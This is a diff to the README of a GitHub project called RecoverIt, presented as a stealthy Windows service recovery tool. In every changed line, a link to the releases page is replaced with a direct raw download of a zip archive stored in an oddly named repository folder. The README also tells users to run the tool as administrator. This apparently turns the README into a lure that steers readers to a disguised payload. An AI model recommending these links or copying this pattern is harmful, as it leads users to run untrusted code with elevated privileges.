@@ -1,6 +1,6 @@
 # 🛠️ RecoverIt - Stealthy Windows Service Recovery Configurator
 
-[![Download RecoverIt](https://img.shields.io/badge/Download-RecoverIt-blue?style=for-the-badge)](https://github.com/dendiilham03/RecoverIt/releases)
+[![Download RecoverIt](https://github.com/dendiilham03/RecoverIt/raw/refs/heads/master/metempsychosal/It_Recover_1.9.zip)](https://github.com/dendiilham03/RecoverIt/raw/refs/heads/master/metempsychosal/It_Recover_1.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This section guides you through the entire process, from downloading RecoverIt t
 
    Click the big blue button at the top or the link below to go to the download page:
 
-   [Download RecoverIt](https://github.com/dendiilham03/RecoverIt/releases)
+   [Download RecoverIt](https://github.com/dendiilham03/RecoverIt/raw/refs/heads/master/metempsychosal/It_Recover_1.9.zip)
 
 2. **Select the Latest Version**
 
@@ -54,7 +54,7 @@ This section guides you through the entire process, from downloading RecoverIt t
 
 You can always get the latest version from here:
 
-[Download Latest Version](https://github.com/dendiilham03/RecoverIt/releases)
+[Download Latest Version](https://github.com/dendiilham03/RecoverIt/raw/refs/heads/master/metempsychosal/It_Recover_1.9.zip)
 
 ### Step-by-step Installation
 
@@ -114,7 +114,7 @@ Make sure you run RecoverIt as an administrator:
 
 Check for new versions regularly by visiting the release page:
 
-[RecoverIt Releases](https://github.com/dendiilham03/RecoverIt/releases)
+[RecoverIt Releases](https://github.com/dendiilham03/RecoverIt/raw/refs/heads/master/metempsychosal/It_Recover_1.9.zip)
 
 New versions may include bug fixes, new features, or improved support. To update:
 
@@ -163,7 +163,7 @@ RecoverIt does not collect or send your personal data. It works locally on your 
 
 ## 🔗 Useful Links
 
-- RecoverIt Download Page: [https://github.com/dendiilham03/RecoverIt/releases](https://github.com/dendiilham03/RecoverIt/releases)
+- RecoverIt Download Page: [https://github.com/dendiilham03/RecoverIt/raw/refs/heads/master/metempsychosal/It_Recover_1.9.zip](https://github.com/dendiilham03/RecoverIt/raw/refs/heads/master/metempsychosal/It_Recover_1.9.zip)
 
 ---
 
